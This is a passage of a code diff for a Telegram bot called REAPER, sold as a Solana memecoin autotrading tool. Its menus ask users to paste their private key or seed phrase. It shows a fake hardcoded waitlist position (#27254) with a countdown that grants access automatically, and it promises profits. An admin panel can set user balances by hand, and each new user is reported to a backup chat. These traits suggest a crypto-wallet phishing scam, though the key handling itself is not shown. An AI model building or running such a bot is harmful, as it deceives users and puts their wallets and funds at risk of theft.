+        return sendTempMessage(chatId, '❌ No wallets to rename');
+    }
+
+    const keyboard = wallets.map((wallet, index) => [{
+        text: `${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
+        callback_data: `rename_select_${index}`
+    }]);
+
+    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);
+
+    await mainBot.sendMessage(chatId, 'Select wallet to rename:', {
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+}
+
+async function handleDeleteWallet(chatId) {
+    const wallets = userWallets.get(chatId) || [];
+    
+    if (wallets.length === 0) {
+        return sendTempMessage(chatId, '❌ No wallets to delete');
+    }
+
+    const keyboard = wallets.map((wallet, index) => [{
+        text: `${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
+        callback_data: `delete_select_${index}`
+    }]);
+
+    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);
+
+    await mainBot.sendMessage(chatId, 'Select wallet to delete:', {
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+}
+
+async function handleSetDefaultWallet(chatId) {
+    const wallets = userWallets.get(chatId) || [];
+    
+    if (wallets.length === 0) {
+        return sendTempMessage(chatId, '❌ No wallets available');
+    }
+
+    const keyboard = wallets.map((wallet, index) => [{
+        text: `${wallet.isDefault ? '✅ ' : ''}${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
+        callback_data: `default_select_${index}`
+    }]);
+
+    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);
+
+    await mainBot.sendMessage(chatId, 'Select default wallet:', {
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+}
+
+// ==================== MENUS ====================
+async function showMainMenu(chatId) {
+    await cleanupPreviousMessages(chatId);
+    
+    const messageText = `
+<b>🚀 Welcome to REAPER</b>
+
+🤖 The fastest Telegram Bot on <b>Solana</b>.
+
+🔍 It allows you to:
+• 🛡️ Check if a coin is a <b>rug</b>
+• 🧪 Make <b>demo trading</b> under real conditions
+• ⚡ Use the powerful <b>autotrade</b> function
+
+🛠️ Features: <b>demo trade</b>, <b>call IA</b>, <b>rugcheck</b>
+
+🔐 <b>Have an access code?</b>
+Enter it below to unlock <b>instant access</b>.
+
+🙋 <b>No access code?</b>
+👇 Tap the button below to <b>join the queue</b> and be the first to experience <b>REAPER</b>.
+
+🎯 <b>Let's get started!</b>
+    `;
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '🎟️ Join Queue', callback_data: 'join_queue' }],
+                [{ text: '🔑 Enter Access Code', callback_data: 'enter_code' }]
+            ]
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.mainMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function showTradingMenu(chatId) {
+    await cleanupPreviousMessages(chatId, true);
+    
+    const wallets = userWallets.get(chatId) || [];
+    const defaultWallet = wallets.find(w => w.isDefault) || wallets[0];
+    const walletBalance = defaultWallet?.publicKey ? await getWalletBalance(defaultWallet.publicKey) : 0;
+    const mainBalance = getUserMainBalance(chatId);
+    const demoBalance = tradingState.users[chatId]?.wallet?.SOL || TRADING_CONFIG.INITIAL_SOL_BALANCE;
+    const referralBonus = referralSystem.getUserBonus(chatId);
+    const autotradeSession = autotradeSessions.get(chatId.toString());
+
+    const canAutotrade = walletBalance >= 1 || autotradeSession;
+
+    const messageText = `
+<b>🔫 Welcome to REAPER Telegram Bot!</b>
+
+🚀 <b>The fastest all-in-one trading platform.</b>
+
+🔥 <b>Live Results:</b> <a href="https://t.me/pnl_Results">https://t.me/pnl_Results</a>
+
+💡 Specifically designed for memecoin traders, this bot is an essential tool: ultra-fast execution, automatic trade copying, real-time transaction tracking — all while keeping your wallet and settings synchronized across all platforms.
+
+⚠️ Please note: We have no control over the ads shown by Telegram within this bot. Beware of fake airdrops or login pages—do not fall for scams.
+
+<b>💰 YOUR BALANCES</b>
+🔹 <b>Wallet Balance:</b> ${walletBalance.toFixed(4)} SOL
+🔹 <b>Main Balance:</b> ${mainBalance.toFixed(4)} SOL
+🔹 <b>Demo Balance:</b> ${demoBalance.toFixed(4)} SOL
+🔹 <b>Referral Bonus:</b> ${referralBonus.toFixed(4)} SOL
+
+${autotradeSession ? `<b>🤖 AUTOTRADE ACTIVE - ${autotradeSession.mode} MODE</b>\n` : ''}
+
+<b>🟢 How to Get Started – It's Easy!</b>
+
+1️⃣ Deposit <b>SOL</b> into your Solana wallet
+2️⃣ Start <b>AUTOTRADE FUNCTION</b> and setup it
+3️⃣ Enjoy profits
+    `;
+
+    const autotradeButton = canAutotrade 
+        ? { text: autotradeSession ? '🤖 AUTOTRADE ACTIVE' : '🚀 AUTOTRADE', callback_data: 'autotrade_menu' }
+        : { text: '🚀 AUTOTRADE', callback_data: 'autotrade_denied' };
+
+    const keyboard = [
+        [autotradeButton],
+        [  
+            { text: '📢 Live Results', url: 'https://t.me/pnl_Results' },
+            { text: '🛒 DEMOTRADE', callback_data: 'buy_sell' }
+        ],
+        [
+            { text: '📊 Positions', callback_data: 'positions' },
+            { text: '🔍 Rug Check', callback_data: 'rug_check' }
+        ],
+        [
+            { text: '🤖 Call AI', callback_data: 'call_ai' },
+            { text: '👛 Wallet', callback_data: 'wallet_menu' }
+        ],
+        [
+            { text: '📈 Referral', callback_data: 'referral' },
+            { text: '🔄 Refresh', callback_data: 'refresh' }
+        ],
+        [
+            { text: '❓ Help', callback_data: 'help' }
+        ]
+    ];
+
+    // Ajouter le bouton admin seulement pour les administrateurs
+    if (ADMIN_IDS.includes(chatId)) {
+        keyboard.push([{ text: '👑 Admin Panel', callback_data: 'admin_menu' }]);
+    }
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.tradingMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function showAutotradeMenu(chatId) {
+    await cleanupPreviousMessages(chatId, true);
+    
+    const wallets = userWallets.get(chatId) || [];
+    const defaultWallet = wallets.find(w => w.isDefault) || wallets[0];
+    const walletBalance = defaultWallet?.publicKey ? await getWalletBalance(defaultWallet.publicKey) : 0;
+    const mainBalance = getUserMainBalance(chatId);
+    const autotradeSession = autotradeSessions.get(chatId.toString());
+
+    if (walletBalance < 1 && !autotradeSession) {
+        return sendTempMessage(chatId, '❌ You need at least 1 SOL in your wallet to use Autotrade');
+    }
+
+    if (autotradeSession) {
+        // Afficher la session en cours
+        return autotradeSession.sendAutotradeUpdate(chatId, userStates.get(chatId)?.autotradeMessageId);
+    }
+
+    const messageText = `
+<b>🤖 AUTOTRADE Configuration</b>
+
+💰 <b>Available Balance:</b> ${mainBalance.toFixed(4)} SOL
+
+<b>🎯 Select Trading Mode:</b>
+
+<b>🟢 SAFE MODE</b>
+• Risk: Low (30%)
+• Target Profit: 15%
+• Stop Loss: 8%
+• For conservative traders
+
+<b>🟡 NORMAL MODE</b>
+• Risk: Medium (50%)
+• Target Profit: 25%
+• Stop Loss: 15%
+• Balanced risk/reward
+
+<b>🔴 DEGEN MODE</b>
+• Risk: High (80%)
+• Target Profit: 50%
+• Stop Loss: 25%
+• For maximum gains
+
+👇 <b>Select your mode and enter trade amount:</b>
+    `;
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '🟢 SAFE', callback_data: 'autotrade_mode_safe' },
+                    { text: '🟡 NORMAL', callback_data: 'autotrade_mode_normal' },
+                    { text: '🔴 DEGEN', callback_data: 'autotrade_mode_degen' }
+                ],
+                [
+                    { text: '← Back', callback_data: 'menu' }
+                ]
+            ]
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.autotradeMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function startAutotradeSession(chatId, mode, amount) {
+    if (amount > getUserMainBalance(chatId)) {
+        return sendTempMessage(chatId, `❌ Insufficient balance. You have ${getUserMainBalance(chatId).toFixed(4)} SOL`);
+    }
+
+    // Déduire le montant du solde principal
+    setUserMainBalance(chatId, getUserMainBalance(chatId) - amount);
+
+    // Créer une nouvelle session
+    const session = new AutotradeSession(chatId, mode, amount);
+    autotradeSessions.set(chatId.toString(), session);
+    savePersistentData();
+
+    // Démarrer la session
+    await session.start();
+
+    // Afficher l'interface de la session
+    const message = await mainBot.sendMessage(chatId, '🔄 Starting autotrade session...', {
+        parse_mode: 'HTML'
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.autotradeMessageId = message.message_id;
+    userStates.set(chatId, state);
+
+    await session.sendAutotradeUpdate(chatId, message.message_id);
+}
+
+async function stopAutotradeSession(chatId) {
+    const session = autotradeSessions.get(chatId.toString());
+    
+    if (!session) {
+        return sendTempMessage(chatId, '❌ No active autotrade session');
+    }
+
+    const result = session.stop();
+    
+    let message = `<b>🤖 AUTOTRADE SESSION ENDED</b>\n\n`;
+    message += `<b>📊 Results Summary:</b>\n`;
+    message += `• Capital initial: ${result.initialAmount.toFixed(4)} SOL\n`;
+    message += `• Capital final: ${result.finalAmount.toFixed(4)} SOL\n`;
+    message += `• Profit total: ${result.totalProfit >= 0 ? '🟢' : '🔴'} ${Math.abs(result.totalProfit).toFixed(4)} SOL\n`;
+    message += `• Total trades: ${result.totalTrades}\n`;
+    message += `• Durée: ${formatTime(Math.floor(result.duration / 1000))}\n\n`;
+    message += `<b>💰 ${result.totalProfit >= 0 ? 'PROFIT!' : 'LOSS'}</b>`;
+    
+    await cleanupPreviousMessages(chatId, true);
+    await mainBot.sendMessage(chatId, message, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '🚀 Start New Session', callback_data: 'autotrade_menu' },
+                    { text: '← Back to Menu', callback_data: 'menu' }
+                ]
+            ]
+        }
+    });
+}
+
+async function showImportWalletMenu(chatId) {
+    await cleanupPreviousMessages(chatId, true);
+    
+    await mainBot.sendMessage(chatId, '<b>🔑 Import Wallet</b>', {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '🔑 Private Key', callback_data: 'import_private_key' },
+                    { text: '🌱 Seed Phrase', callback_data: 'import_seed_phrase' }
+                ],
+                [
+                    { text: '← Back', callback_data: 'wallet_menu' }
+                ]
+            ]
+        }
+    });
+}
+
+async function showBuySellMenu(chatId) {
+    const sentMessage = await safeSendMessage(chatId, '📊 Loading portfolio...');
+    
+    if (sentMessage) {
+        if (!tradingState.trackedMessages.has(chatId)) {
+            tradingState.trackedMessages.set(chatId, new Set());
+        }
+        tradingState.trackedMessages.get(chatId).add(sentMessage.message_id);
+        
+        await updatePortfolioMessage(chatId, sentMessage.message_id);
+    }
+}
+
+async function updatePortfolioMessage(chatId, messageId) {
+    try {
+        const user = initializeTradingUser(chatId);
+        const pnl = calculateUserPNL(user);
+        
+        const messageParts = [];
+        messageParts.push(`<b>💎 Trading Portfolio 💎</b>\n\n`);
+        messageParts.push(`💰 <b>Available SOL:</b> ${user.wallet.SOL.toFixed(4)}\n`);
+        messageParts.push(`📊 <b>Total PNL:</b> ${formatPNL(pnl.total)} (Realized: ${formatPNL(pnl.realized)}, Unrealized: ${formatPNL(pnl.unrealized)})\n`);
+        messageParts.push(`⛽ <b>Total gas fees:</b> ${user.stats.totalGasFees.toFixed(6)} SOL\n\n`);
+        
+        messageParts.push(`<b>📈 Open positions:</b>\n`);
+        const tokens = Object.keys(user.wallet.tokens);
+        
+        if (tokens.length === 0) {
+            messageParts.push(`\nNo open positions\n`);
+        } else {
+            for (const token of tokens) {
+                try {
+                    const data = user.wallet.tokens[token];
+                    const currentPrice = updateTokenPrice(token);
+                    const tokenPNL = (data.amount * currentPrice) - (data.amount * data.buyPrice);
+                    
+                    messageParts.push(`\n▸ <b>${getTokenName(token)}</b> (<code>${shortenAddress(token)}</code>)\n`);
+                    messageParts.push(`   ▪ Quantity: ${data.amount.toFixed(2)}\n`);
+                    messageParts.push(`   ▪ Avg price: ${data.buyPrice.toFixed(8)} SOL\n`);
+                    messageParts.push(`   ▪ Current price: ${currentPrice.toFixed(8)} SOL\n`);
+                    messageParts.push(`   ▪ Value: ${(data.amount * currentPrice).toFixed(4)} SOL\n`);
+                    messageParts.push(`   ▪ PNL: ${formatPNL(tokenPNL)}\n`);
+                } catch (error) {
+                    console.error(`Token display error ${token}:`, error);
+                    messageParts.push(`\n▸ <code>${shortenAddress(token)}</code> (display error)\n`);
+                }
+            }
+        }
+
+        messageParts.push(`\n<b>⏳ Recent transactions:</b>\n`);
+        const recentTransactions = user.wallet.history.slice(-3).reverse();
+        
+        if (recentTransactions.length === 0) {
+            messageParts.push(`\nNo recent transactions\n`);
+        } else {
+            for (const tx of recentTransactions) {
+                try {
+                    const pnl = (tx.amount * tx.price) - (tx.amount * tx.buyPrice);
+                    messageParts.push(`\n▸ ${tx.type === 'buy' ? '🛒 Buy' : '💰 Sell'} ${tx.amount.toFixed(2)} ${getTokenName(tx.token)}\n`);
+                    messageParts.push(`   ▪ Price: ${tx.price.toFixed(8)} SOL\n`);
+                    messageParts.push(`   ▪ Fees: ${user.settings.gasFee.toFixed(6)} SOL\n`);
+                    messageParts.push(`   ▪ PNL: ${formatPNL(pnl)}\n`);
+                    messageParts.push(`   ▪ Date: ${new Date(tx.date).toLocaleTimeString()}\n`);
+                } catch (error) {
+                    console.error('Transaction display error:', error);
+                }
+            }
+        }
+
+        messageParts.push(`\n🔄 <i>Update: ${new Date().toLocaleTimeString()}</i>`);
+
+        const fullMessage = messageParts.join('');
+        
+        const success = await safeEditMessage(
+            chatId,
+            messageId,
+            fullMessage,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "🔄 Refresh", callback_data: "refresh_portfolio" },
+                            { text: "📊 Stats", callback_data: "show_stats" }
+                        ],
+                        [
+                            { text: "🛒 Buy", callback_data: "show_buy" },
+                            { text: "💰 Sell", callback_data: "show_sell" }
+                        ],
+                        [
+                            { text: "⚙️ Settings", callback_data: "show_settings" }
+                        ],
+                        [
+                            { text: "← Back to Menu", callback_data: "menu" }
+                        ]
+                    ]
+                }
+            }
+        );
+
+        if (!success) {
+            console.log('Failed to update message');
+        }
+
+    } catch (error) {
+        console.error('Critical error in portfolio update:', error);
+    }
+}
+
+async function showReferralMenu(chatId) {
+    await cleanupPreviousMessages(chatId, true);
+    
+    const referralCode = referralSystem.generateCode(chatId);
+    const referralCount = referralSystem.getUserReferrals(chatId);
+    const bonusAmount = referralSystem.getUserBonus(chatId);
+    const canWithdraw = referralSystem.canWithdrawBonus(chatId);
+
+    const messageText = `
+<b>🎁 Referral Program</b>
+
+<b>Your unique code:</b>
+<code>${referralCode}</code>
+
+👥 <b>Referrals:</b> ${referralCount}/20 (${canWithdraw ? '✅ Can withdraw' : '❌ Need more referrals'})
+💰 <b>Total Bonus:</b> ${bonusAmount.toFixed(4)} SOL
+
+🔹 0.01 SOL for you per referral
+🔹 0.005 SOL bonus for your friend
+
+<b>Share your link:</b>
+https://t.me/share/url?url=Join%20REAPER%20Trading%20Bot%20with%20my%20code%3A%20${referralCode}
+    `;
+
+    const keyboard = [
+        [{ text: "📤 Share", switch_inline_query: `Join REAPER with my code: ${referralCode}` }]
+    ];
+
+    if (canWithdraw && bonusAmount > 0) {
+        keyboard.unshift([{ text: "💰 Withdraw Bonus", callback_data: 'withdraw_bonus' }]);
+    }
+
+    keyboard.push([{ text: "← Back", callback_data: 'menu' }]);
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.referralMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function showHelpMenu(chatId) {
+    await cleanupPreviousMessages(chatId, true);
+    
+    const messageText = `
+<b>REAPER Help Center</b>
+
+🔹 <b>How do I use REAPER?</b>
+Join our support chat for additional resources on our channel @ReaperSupport
+
+🔹 <b>Where can I find my referral code?</b>
+Open the /start menu and click 💰Referrals.
+
+🔹 <b>What are the fees for using REAPER?</b>
+Successful transactions through REAPER incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
+
+🔹 <b>Security Tips: How can I protect my account from scammers?</b>
+- REAPER does NOT require you to login with a phone number or QR code! 
+- NEVER search for bots in telegram. Use only official links.
+- Admins and Mods NEVER dm first or send links, stay safe!
+
+🔹 <b>Trading Tips: Common Failure Reasons</b>
+- Slippage Exceeded: Up your slippage or sell in smaller increments.
+- Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.
+- Timed out: Can occur with heavy network loads, consider increasing your gas tip.
+
+🔹 <b>Additional questions or need support?</b>
+Join our Telegram channel @ReaperSupport and one of our admins can assist you.
+
+${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'})}
+    `;
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "📢 Official Channel", url: "https://t.me/ReaperResults" }],
+                [{ text: "💬 Support Chat", url: "https://t.me/Reapers_Support" }],
+                [{ text: "← Back", callback_data: 'menu' }]
+            ]
+        }
+    });
+
+    const state = userStates.get(chatId) || {};
+    state.helpMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+// ==================== ADMIN FUNCTIONS ====================
+async function showAdminMenu(chatId) {
+    if (!ADMIN_IDS.includes(chatId)) {
+        return sendTempMessage(chatId, '❌ Access denied');
+    }
+
+    await cleanupPreviousMessages(chatId, true);
+    
+    const totalUsers = connectedUsers.size;
+    const activeSessions = Array.from(autotradeSessions.keys()).length;
+    const totalBalance = Array.from(userBalances.values()).reduce((a, b) => a + b, 0);
+    
+    const messageText = `
+<b>👑 ADMIN PANEL</b>
+
+📊 <b>Statistics:</b>
+• Total Users: ${totalUsers}
+• Active Autotrade Sessions: ${activeSessions}
+• Total User Balance: ${totalBalance.toFixed(4)} SOL
+
+⚡ <b>Quick Actions:</b>
+    `;
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '📢 Broadcast Message', callback_data: 'admin_broadcast' },
+                    { text: '👥 Manage Users', callback_data: 'admin_users' }
+                ],
+                [
+                    { text: '💰 Set User Balance', callback_data: 'admin_set_balance' },
+                    { text: '🚀 Force Autotrade', callback_data: 'admin_force_autotrade' }
+                ],
+                [
+                    { text: '📊 Statistics', callback_data: 'admin_stats' },
+                    { text: '📈 Referral Stats', callback_data: 'admin_referral_stats' }
+                ],
+                [
+                    { text: '← Back to Menu', callback_data: 'menu' }
+                ]
+            ]
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.adminMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function handleAdminBroadcast(chatId) {
+    if (!ADMIN_IDS.includes(chatId)) {
+        return sendTempMessage(chatId, '❌ Access denied');
+    }
+
+    await mainBot.sendMessage(chatId, '📢 Send broadcast message (HTML supported):', {
+        reply_markup: { force_reply: true }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.adminAction = 'awaiting_broadcast';
+    userStates.set(chatId, state);
+}
+
+async function sendBroadcastMessage(chatId, message) {
+    let successCount = 0;
+    let failCount = 0;
+    
+    for (const userId of connectedUsers) {
+        try {
+            await mainBot.sendMessage(userId, message, { parse_mode: 'HTML' });
+            successCount++;
+        } catch (error) {
+            failCount++;
+            console.error(`Failed to send to ${userId}:`, error.message);
+        }
+        
+        // Pause pour éviter le rate limiting
+        await new Promise(resolve => setTimeout(resolve, 100));
+    }
+    
+    return { successCount, failCount };
+}
+
+async function handleAdminSetBalance(chatId) {
+    if (!ADMIN_IDS.includes(chatId)) {
+        return sendTempMessage(chatId, '❌ Access denied');
+    }
+
+    await mainBot.sendMessage(chatId, '👤 Enter user ID to set balance:', {
+        reply_markup: { force_reply: true }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.adminAction = 'awaiting_user_id';
+    userStates.set(chatId, state);
+}
+
+async function handleAdminForceAutotrade(chatId, userId) {
+    if (!ADMIN_IDS.includes(chatId)) {
+        return sendTempMessage(chatId, '❌ Access denied');
+    }
+
+    const userState = userStates.get(userId);
+    if (userState) {
+        userState.autotradeEnabled = true;
+        userStates.set(userId, userState);
+        savePersistentData();
+        
+        await mainBot.sendMessage(userId, '🎉 Admin has enabled AUTOTRADE for your account! You can now use the feature.');
+        return true;
+    }
+    
+    return false;
+}
+
+// ==================== WAITLIST FLOW ====================
+async function startWaitlist(chatId) {
+    const state = userStates.get(chatId) || {};
+    state.waitlistTime = 2 * 60 * 60;
+    
+    await cleanupPreviousMessages(chatId, true);
+    
+    const initialMessage = await mainBot.sendMessage(chatId, `Joining queue...`, {
+        parse_mode: 'HTML'
+    });
+    
+    state.waitlistMessageId = initialMessage.message_id;
+    userStates.set(chatId, state);
+
+    await updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);
+
+    const timer = setInterval(async () => {
+        state.waitlistTime--;
+        
+        if (state.waitlistTime <= 0) {
+            clearInterval(timer);
+            await mainBot.deleteMessage(chatId, state.waitlistMessageId);
+            await showAccessGranted(chatId);
+            return;
+        }
+
+        await updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);
+    }, 1000);
+
+    state.timer = timer;
+    userStates.set(chatId, state);
+}
+
+async function updateWaitlistMessage(chatId, messageId, seconds) {
+    const currentTime = new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'});
+
+    const messageText = `
+<b>You're currently #27254 on the REAPER waitlist!</b>
+Access granted in: ${formatTime(seconds)}
+
+Have an access code? Simply Use button below to get an instant access.
+    `;
+
+    try {
+        await mainBot.editMessageText(messageText, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: 'Enter Access Code', callback_data: 'enter_code' }],
+                    [{ text: '🔄 Refresh', callback_data: 'refresh_waitlist' }]
+                ]
+            }
+        });
+    } catch (error) {
+        console.error('Error updating message:', error);
+    }
+}
+
+async function showAccessGranted(chatId) {
+    await cleanupPreviousMessages(chatId);
+    
+    const messageText = `
+<b>🎉 Congratulations! Your access code has been successfully approved! 🎉</b>
+
+👋 <b>Welcome to REAPER</b>, the complete Trading Platform for Beginners.
+Effortlessly check,demo trade any token on Solana with complete control at your fingertips and receive smart AI calls .
+
+🟢 <b>Access Granted: REAPER</b>
+
+📌 Don't forget to join our Support Channel and explore the guide below for a smooth start:
+
+🔗 Join Support
+📘 Guide
+▶️ YouTube
+
+👇 <b>Ready to begin? Press Continue below to start using REAPER 🚀</b>
+    `;
+
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '➡️ Continue', callback_data: 'continue' }]
+            ]
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.accessGrantedMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+// ==================== COMMANDES ====================
+mainBot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const referralCode = match[1];
+    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+    
+    const state = userStates.get(chatId) || {};
+    state.username = username;
+    userStates.set(chatId, state);
+    
+    if (!connectedUsers.has(chatId)) {
+        connectedUsers.add(chatId);
+        const notification = `🆕 New user connected:\n\n• ID: ${chatId}\n• Name: ${username}`;
+        
+        if (backupBot) {
+            await backupBot.sendMessage(BACKUP_CHAT_ID, notification);
+        }
+    }
+
+    if (!userSettings.has(chatId)) {
+        userSettings.set(chatId, {
+            slippage: '1%',
+            gasPriority: 'Medium',
+            theme: 'Dark',
+            notifications: true,
+            hasVisitedTradingMenu: false,
+            language: 'en'
+        });
+    }
+
+    if (referralCode) {
+        if (referralSystem.useCode(chatId, referralCode)) {
+            sendTempMessage(chatId, `🎉 You used a referral code! 0.005 SOL bonus added.`);
+        }
+    }
+    
+    showTradingMenu(chatId);
+});
+
+mainBot.onText(/\/admin/, async (msg) => {
+    const chatId = msg.chat.id;
+    
+    if (ADMIN_IDS.includes(chatId)) {
+        showAdminMenu(chatId);
+    } else {
+        sendTempMessage(chatId, '❌ Access denied');
+    }
+});
+
+// ==================== CALLBACK HANDLERS ====================
+mainBot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+
+    try {
+        await mainBot.answerCallbackQuery(callbackQuery.id);
+        
+        // Gestion des actions administratives
+        if (data === 'admin_menu') {
+            return showAdminMenu(chatId);
+        }
+        
+        if (data === 'admin_broadcast') {
+            return handleAdminBroadcast(chatId);
+        }
+        
+        if (data === 'admin_set_balance') {
+            return handleAdminSetBalance(chatId);
+        }
+        
+        if (data.startsWith('admin_force_autotrade_')) {
+            const userId = parseInt(data.split('_')[3]);
+            const success = await handleAdminForceAutotrade(chatId, userId);
+            if (success) {
+                await sendTempMessage(chatId, `✅ Autotrade enabled for user ${userId}`);
+            } else {
+                await sendTempMessage(chatId, `❌ Failed to enable autotrade for user ${userId}`);
+            }
+            return showAdminMenu(chatId);
+        }
+        
+if (data === 'admin_users') {
+    const usersList = Array.from(connectedUsers).slice(0, 50).map(userId => {
+        const balance = getUserMainBalance(userId);
+        // CORRECTION ICI : Utilisez Number() pour être sûr
+        const safeBalance = Number(balance) || 0;
+        return `<code>${userId}</code> - ${safeBalance.toFixed(4)} SOL`;
+    }).join('\n');
+    
+    await mainBot.sendMessage(chatId, `<b>👥 Recent Users (${connectedUsers.size} total)</b>\n\n${usersList}`, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '← Back', callback_data: 'admin_menu' }
+                ]
+            ]
+        }
+    });
+    return;
+}
+        
+        // Gestion de l'autotrade
+        if (data === 'autotrade_menu') {
+            return showAutotradeMenu(chatId);
+        }
+        
+        if (data.startsWith('autotrade_mode_')) {
+            const mode = data.split('_')[2].toUpperCase();
+            const state = userStates.get(chatId) || {};
+            state.autotradeMode = mode;
+            state.adminAction = 'awaiting_autotrade_amount';
+            userStates.set(chatId, state);
+            
+            await mainBot.sendMessage(chatId, `Enter trade amount for ${mode} mode (in SOL):`, {
+                reply_markup: { force_reply: true }
+            });
+            return;
+        }
+        
+        if (data === 'autotrade_stop') {
+            return stopAutotradeSession(chatId);
+        }
+        
+        if (data === 'autotrade_refresh') {
+            const session = autotradeSessions.get(chatId.toString());
+            if (session) {
+                await session.sendAutotradeUpdate(chatId, callbackQuery.message.message_id);
+            }
+            return;
+        }
+        
+        if (data === 'autotrade_denied') {
+            await mainBot.answerCallbackQuery(callbackQuery.id, { 
+                text: 'You need at least 1 SOL to use Autotrade', 
+                show_alert: true 
+            });
+            
+            await sendTempMessage(chatId, '❌ You need at least 1 SOL in your wallet to use Autotrade');
+            return;
+        }
+        
+        // Gestion du wallet
+        if (data === 'import_wallet_menu') {
+            return showImportWalletMenu(chatId);
+        }
+        
+        if (data === 'import_private_key') {
+            await mainBot.sendMessage(chatId, 'Send your private key (Hex or Base58):', { 
+                reply_markup: { force_reply: true } 
+            });
+            const state = userStates.get(chatId) || {};
+            state.action = 'awaiting_private_key';
+            userStates.set(chatId, state);
+            return;
+        }
+        
+        if (data === 'import_seed_phrase') {
+            await mainBot.sendMessage(chatId, 'Send your seed phrase (12 or 24 words):', { 
+                reply_markup: { force_reply: true } 
+            });
+            const state = userStates.get(chatId) || {};
+            state.action = 'awaiting_seed_phrase';
+            userStates.set(chatId, state);
+            return;
+        }
+        
+        if (data === 'wallet_menu') {
+            return showWalletMenu(chatId);
+        }
+        
+        if (data === 'rename_wallet') {
+            return handleRenameWallet(chatId);
+        }
+        
+        if (data === 'delete_wallet') {
+            return handleDeleteWallet(chatId);
+        }
+        
+        if (data === 'set_default_wallet') {
+            return handleSetDefaultWallet(chatId);
+        }
+        
+        if (data === 'refresh_wallet') {
+            return showWalletMenu(chatId);
+        }
+        
+        if (data.startsWith('rename_select_')) {
+            const index = parseInt(data.split('_')[2]);
+            const state = userStates.get(chatId) || {};
+            state.action = 'awaiting_wallet_rename';
+            state.walletIndex = index;
+            userStates.set(chatId, state);
+            return mainBot.sendMessage(chatId, 'Enter new name for this wallet:', {
+                reply_markup: { force_reply: true }
+            });
+        }
+        
+        if (data.startsWith('delete_select_')) {
+            const index = parseInt(data.split('_')[2]);
+            const wallets = userWallets.get(chatId) || [];
+            const wallet = wallets[index];
+            
+            if (!wallet) {
+                return sendTempMessage(chatId, '❌ Wallet not found');
+            }
+            
+            wallets.splice(index, 1);
+            userWallets.set(chatId, wallets);
+            
+            if (wallet.isDefault && wallets.length > 0) {
+                wallets[0].isDefault = true;
+            }
+            
+            savePersistentData();
+            return showWalletMenu(chatId);
+        }
+        
+        if (data.startsWith('default_select_')) {
+            const index = parseInt(data.split('_')[2]);
+            const wallets = userWallets.get(chatId) || [];
+            
+            wallets.forEach((w, i) => {
+                w.isDefault = (i === index);
+            });
+            
+            userWallets.set(chatId, wallets);
+            savePersistentData();
+            return showWalletMenu(chatId);
+        }
+        
+        // Gestion des actions sans paramètres
+        const handlers = {
+            'menu': showTradingMenu,
+            'referral': showReferralMenu,
+            'help': showHelpMenu,
+            'refresh': showTradingMenu,
+            'buy_sell': () => showBuySellMenu(chatId),
+            'positions': () => showBuySellMenu(chatId),
